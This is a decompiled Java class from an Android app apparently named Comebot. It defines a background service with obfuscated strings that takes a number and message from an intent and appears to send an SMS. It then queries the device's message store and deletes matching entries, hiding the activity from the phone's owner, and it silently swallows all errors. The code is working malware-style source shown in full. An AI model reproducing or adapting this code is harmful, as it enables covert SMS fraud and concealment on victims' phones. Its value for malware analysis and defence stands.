package anu_bispro.app;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;

public class dsws extends Service {
  a a = new a();
  
  d b = new d();
  
  public void a(Context paramContext, String paramString1, String paramString2) {
    try {
      Uri uri = Uri.parse(c.a("\005b\by\003c\0227I\"\025`\025\"\025h\by"));
      Cursor cursor = paramContext.getContentResolver().query(uri, new String[] { b.a("dO_"), c.a("y\016\003l\002R\017i"), b.a("ZB_T^UH"), c.a("\026h\024~\tc"), b.a("BZR^"), c.a("\004b\002t") }, null, null, null);
      if (cursor != null && cursor.moveToFirst()) {
        boolean bool;
        do {
          long l = cursor.getLong(0);
          cursor.getLong(1);
          String str = cursor.getString(2);
          if (!paramString1.equals(cursor.getString(5)) && str.equals(paramString2)) {
            ContentResolver contentResolver = paramContext.getContentResolver();
            StringBuilder stringBuilder = new StringBuilder();
            this();
            contentResolver.delete(Uri.parse(stringBuilder.insert(0, b.a("ETHOCUR\001\t\024UVU\024")).append(l).toString()), null, null);
          } 
          bool = cursor.moveToNext();
        } while (bool);
      } 
    } catch (Exception exception) {}
  }
  
  public void b(Context paramContext, String paramString1, String paramString2) {
    if (this.a.a(paramContext, c.a("i\003a9~\021~")).contains(b.a("RIS^"))) {
      this.a.d(paramContext);
      a(paramContext, "", paramString1);
      c(paramContext, "", paramString1);
    } 
    this.a.b(paramContext, paramString1, paramString2);
  }
  
  public IBinder onBind(Intent paramIntent) {
    return null;
  }
  
  public int onStartCommand(Intent paramIntent, int paramInt1, int paramInt2) {
    try {
      b((Context)this, paramIntent.getStringExtra(c.a("c\023`")), paramIntent.getStringExtra(b.a("KH")));
    } catch (Exception exception) {}
    try {
      Thread.sleep(5000L);
    } catch (InterruptedException interruptedException) {
      interruptedException.printStackTrace();
    } 
    return 1;
  }
}


/* Location:              /home/fahim/Desktop/Comebot1-dex2jar.jar!/anu_bispro/app/dsws.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */